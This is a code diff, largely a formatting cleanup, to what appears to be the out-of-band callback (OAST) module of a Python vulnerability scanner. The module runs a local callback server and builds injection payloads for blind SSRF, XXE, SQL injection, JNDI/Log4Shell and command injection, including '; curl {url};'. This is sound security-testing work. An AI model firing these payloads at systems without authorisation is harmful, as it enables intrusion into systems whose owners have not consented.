@@ -18,8 +18,6 @@
 #   在插件 verify() 中调用 oast.get_payload() 获取唯一回调 URL，
 #   将其注入 payload，发起请求后调用 oast.wait_callback() 等待回调。
 import datetime
-import hashlib
-import json
 import socket
 import threading
 import time
@@ -27,10 +25,10 @@ import uuid
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from typing import Any, Dict, List, Optional, Tuple
 
-
 # ============================================================
 # 回调记录存储
 # ============================================================
+
 
 class CallbackStore:
     """线程安全的回调记录存储
@@ -80,9 +78,9 @@ class CallbackStore:
         with self._lock:
             total = sum(len(v) for v in self._records.values())
             return {
-                'registered_ids': len(self._records),
-                'total_callbacks': total,
-                'with_callback': sum(1 for v in self._records.values() if v),
+                "registered_ids": len(self._records),
+                "total_callbacks": total,
+                "with_callback": sum(1 for v in self._records.values() if v),
             }
 
 
@@ -99,31 +97,31 @@ def get_store() -> CallbackStore:
 # 交互 ID 生成
 # ============================================================
 
+
 def generate_interaction_id() -> str:
     """生成唯一交互 ID（16 位十六进制）"""
     return uuid.uuid4().hex[:16]
 
 
-def build_payload_domain(interaction_id: str, base_domain: str = 'oast.local') -> str:
+def build_payload_domain(interaction_id: str, base_domain: str = "oast.local") -> str:
     """构建回调域名
 
     如 interaction_id=abc123, base_domain=oast.local → abc123.oast.local
     """
-    return f'{interaction_id}.{base_domain}'
+    return f"{interaction_id}.{base_domain}"
 
 
-def build_payload_url(interaction_id: str,
-                      protocol: str = 'http',
-                      host: str = '127.0.0.1',
-                      port: int = 5555,
-                      path: str = '/') -> str:
+def build_payload_url(
+    interaction_id: str, protocol: str = "http", host: str = "127.0.0.1", port: int = 5555, path: str = "/"
+) -> str:
     """构建回调 URL（用于 HTTP 带外检测）"""
-    return f'{protocol}://{host}:{port}{path}?id={interaction_id}'
+    return f"{protocol}://{host}:{port}{path}?id={interaction_id}"
 
 
 # ============================================================
 # 本地 HTTP 回调服务器
 # ============================================================
+
 
 class CallbackHTTPHandler(BaseHTTPRequestHandler):
     """HTTP 回调请求处理器
@@ -133,36 +131,36 @@ class CallbackHTTPHandler(BaseHTTPRequestHandler):
 
     def _handle(self):
         """处理请求并记录回调"""
-        from urllib.parse import urlparse, parse_qs
+        from urllib.parse import parse_qs, urlparse
 
         parsed = urlparse(self.path)
         params = parse_qs(parsed.query)
-        interaction_id = params.get('id', [None])[0]
+        interaction_id = params.get("id", [None])[0]
 
         callback = {
-            'protocol': 'http',
-            'method': self.command,
-            'path': self.path,
-            'from': self.client_address[0],
-            'timestamp': datetime.datetime.now().isoformat(),
-            'headers': dict(self.headers),
-            'raw': f'{self.command} {self.path}',
+            "protocol": "http",
+            "method": self.command,
+            "path": self.path,
+            "from": self.client_address[0],
+            "timestamp": datetime.datetime.now().isoformat(),
+            "headers": dict(self.headers),
+            "raw": f"{self.command} {self.path}",
         }
 
         if interaction_id:
             _store.record(interaction_id, callback)
 
         # 读取 body（POST 等）
-        content_length = int(self.headers.get('Content-Length', 0))
+        content_length = int(self.headers.get("Content-Length", 0))
         if content_length > 0:
             body = self.rfile.read(content_length)
-            callback['body'] = body.decode('utf-8', errors='replace')[:1024]
+            callback["body"] = body.decode("utf-8", errors="replace")[:1024]
 
         # 返回 200 OK
         self.send_response(200)
-        self.send_header('Content-Type', 'text/plain')
+        self.send_header("Content-Type", "text/plain")
         self.end_headers()
-        self.wfile.write(b'OK')
+        self.wfile.write(b"OK")
 
     def do_GET(self):
         self._handle()
@@ -184,7 +182,7 @@ class OASTServer:
     # 允许端口复用（避免测试时 TIME_WAIT 状态导致端口占用）
     allow_reuse_address = True
 
-    def __init__(self, host: str = '127.0.0.1', port: int = 5555):
+    def __init__(self, host: str = "127.0.0.1", port: int = 5555):
         self.host = host
         self.port = port
         self._server: Optional[HTTPServer] = None
@@ -201,8 +199,9 @@ class OASTServer:
             self._server = HTTPServer((self.host, self.port), CallbackHTTPHandler)
             self._server.allow_reuse_address = True
             # 使用 serve_forever 替代 handle_request 循环，确保请求被及时处理
-            self._thread = threading.Thread(target=self._server.serve_forever,
-                                             kwargs={'poll_interval': 0.1}, daemon=True)
+            self._thread = threading.Thread(
+                target=self._server.serve_forever, kwargs={"poll_interval": 0.1}, daemon=True
+            )
             self._thread.start()
             self._running = True
             return True
@@ -228,14 +227,15 @@ class OASTServer:
     def is_running(self) -> bool:
         return self._running
 
-    def url(self, interaction_id: str, path: str = '/') -> str:
+    def url(self, interaction_id: str, path: str = "/") -> str:
         """构建回调 URL"""
-        return build_payload_url(interaction_id, 'http', self.host, self.port, path)
+        return build_payload_url(interaction_id, "http", self.host, self.port, path)
 
 
 # ============================================================
 # OAST 客户端（供插件调用）
 # ============================================================
+
 
 class OASTClient:
     """OAST 客户端：生成 payload + 等待回调
@@ -249,10 +249,7 @@ class OASTClient:
             return ScanResult(status=STATUS_CONFIRMED, ...)
     """
 
-    def __init__(self,
-                 server: Optional[OASTServer] = None,
-                 provider: str = 'local',
-                 base_domain: str = 'oast.local'):
+    def __init__(self, server: Optional[OASTServer] = None, provider: str = "local", base_domain: str = "oast.local"):
         """
         Args:
             server: 本地 OASTServer 实例（provider='local' 时必填）
@@ -266,7 +263,7 @@ class OASTClient:
         self._payload_url: Optional[str] = None
         self._payload_domain: Optional[str] = None
 
-    def get_payload(self, path: str = '/') -> str:
+    def get_payload(self, path: str = "/") -> str:
         """生成唯一回调 URL
 
         Returns:
@@ -275,12 +272,12 @@ class OASTClient:
         self._interaction_id = generate_interaction_id()
         _store.register(self._interaction_id)
 
-        if self.provider == 'local' and self.server:
+        if self.provider == "local" and self.server:
             self._payload_url = self.server.url(self._interaction_id, path)
         else:
             # Interactsh 或无服务器模式：使用域名
             self._payload_domain = build_payload_domain(self._interaction_id, self.base_domain)
-            self._payload_url = f'http://{self._payload_domain}{path}'
+            self._payload_url = f"http://{self._payload_domain}{path}"
 
         return self._payload_url
 
@@ -327,7 +324,8 @@ class OASTClient:
 # DNS 解析钩子（用于 DNS 带外检测）
 # ============================================================
 
-def check_dns_callback(interaction_id: str, base_domain: str = 'oast.local') -> bool:
+
+def check_dns_callback(interaction_id: str, base_domain: str = "oast.local") -> bool:
     """检查 DNS 回调是否发生（通过 socket.getaddrinfo 反查）
 
     注意：此函数仅用于测试模拟。生产环境应使用 DNS 服务器日志或 dnspython 库。
@@ -345,9 +343,10 @@ def check_dns_callback(interaction_id: str, base_domain: str = 'oast.local') -> 
 # 批量生成 payload（用于并发扫描）
 # ============================================================
 
-def generate_batch_payloads(count: int,
-                            server: Optional[OASTServer] = None,
-                            base_domain: str = 'oast.local') -> List[Tuple[str, str]]:
+
+def generate_batch_payloads(
+    count: int, server: Optional[OASTServer] = None, base_domain: str = "oast.local"
+) -> List[Tuple[str, str]]:
     """批量生成 payload
 
     Args:
@@ -365,7 +364,7 @@ def generate_batch_payloads(count: int,
         if server:
             payload_url = server.url(interaction_id)
         else:
-            payload_url = f'http://{build_payload_domain(interaction_id, base_domain)}/'
+            payload_url = f"http://{build_payload_domain(interaction_id, base_domain)}/"
         results.append((interaction_id, payload_url))
     return results
 
@@ -375,18 +374,18 @@ def generate_batch_payloads(count: int,
 # ============================================================
 
 PAYLOAD_TEMPLATES = {
-    'ssrf': '{url}',  # SSRF：直接注入回调 URL
-    'xxe': '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{url}"> %xxe;]>',
-    'sqli_blind': '1 AND LOAD_FILE(\'\\\\{domain}\\test\')',  # MySQL DNS 带外（Windows UNC）
-    'rce_blind': 'ping -c 1 {domain}',  # RCE 盲注：ping 回调域名
-    'ldap': '${jndi:ldap://{domain}/x}',
-    'command_injection': '; curl {url};',
+    "ssrf": "{url}",  # SSRF：直接注入回调 URL
+    "xxe": '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{url}"> %xxe;]>',
+    "sqli_blind": "1 AND LOAD_FILE('\\\\{domain}\\test')",  # MySQL DNS 带外（Windows UNC）
+    "rce_blind": "ping -c 1 {domain}",  # RCE 盲注：ping 回调域名
+    "ldap": "${jndi:ldap://{domain}/x}",
+    "command_injection": "; curl {url};",
 }
 
 
-def build_payload(vuln_type: str, interaction_id: str,
-                  server: Optional[OASTServer] = None,
-                  base_domain: str = 'oast.local') -> str:
+def build_payload(
+    vuln_type: str, interaction_id: str, server: Optional[OASTServer] = None, base_domain: str = "oast.local"
+) -> str:
     """根据漏洞类型构建 payload
 
     Args:
@@ -398,45 +397,46 @@ def build_payload(vuln_type: str, interaction_id: str,
     Returns:
         Payload 字符串
     """
-    template = PAYLOAD_TEMPLATES.get(vuln_type, '{url}')
+    template = PAYLOAD_TEMPLATES.get(vuln_type, "{url}")
     _store.register(interaction_id)
 
     if server:
         url = server.url(interaction_id)
     else:
-        url = f'http://{build_payload_domain(interaction_id, base_domain)}/'
+        url = f"http://{build_payload_domain(interaction_id, base_domain)}/"
 
     domain = build_payload_domain(interaction_id, base_domain)
     # 使用字符串替换而非 .format()，避免模板中 ${jndi:...} 等花括号被误解析
-    return template.replace('{url}', url).replace('{domain}', domain)
+    return template.replace("{url}", url).replace("{domain}", domain)
 
 
 # ============================================================
 # 模式入口
 # ============================================================
 
+
 def run_oast_mode(args) -> int:
     """OAST 模式入口：启动回调服务器并保持运行
 
     用于独立启动 OAST 服务器，供其他扫描进程远程调用。
     """
-    host = getattr(args, 'oast_host', '127.0.0.1') or '127.0.0.1'
-    port = getattr(args, 'oast_port', 5555) or 5555
+    host = getattr(args, "oast_host", "127.0.0.1") or "127.0.0.1"
+    port = getattr(args, "oast_port", 5555) or 5555
 
     server = OASTServer(host=host, port=port)
     if not server.start():
-        print(f'[!]OAST 服务器启动失败：端口 {port} 被占用')
+        print(f"[!]OAST 服务器启动失败：端口 {port} 被占用")
         return 1
 
-    print(f'[*]OAST 回调服务器已启动：{host}:{port}')
-    print(f'[*]回调 URL 格式：http://{host}:{port}/?id=<interaction_id>')
-    print('[*]按 Ctrl+C 停止')
+    print(f"[*]OAST 回调服务器已启动：{host}:{port}")
+    print(f"[*]回调 URL 格式：http://{host}:{port}/?id=<interaction_id>")
+    print("[*]按 Ctrl+C 停止")
 
     try:
         while True:
             time.sleep(1)
     except KeyboardInterrupt:
-        print('\n[*]停止 OAST 服务器')
+        print("\n[*]停止 OAST 服务器")
         server.stop()
 
     return 0
